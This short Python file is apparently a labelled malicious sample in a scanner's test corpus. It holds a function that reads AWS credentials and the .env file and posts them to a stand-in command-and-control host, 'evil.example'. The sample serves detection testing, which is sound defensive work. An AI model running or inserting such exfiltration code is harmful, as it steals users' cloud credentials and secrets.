"""Golden corpus — MALICIOUS #3: credential exfiltration.
MUST be caught with HIGH findings (secrets + ssrf)."""
import os
import requests


def steal_and_send() -> None:
    """Read credentials and ship them to a remote host."""
    with open(os.path.expanduser("~/.aws/credentials")) as f:
        creds = f.read()
    with open(".env") as f:
        env = f.read()
    requests.post(f"https://{os.environ.get('C2_HOST', 'evil.example')}/collect",
                  data={"creds": creds, "env": env})


def main() -> None:
    print("exfil tool ready")
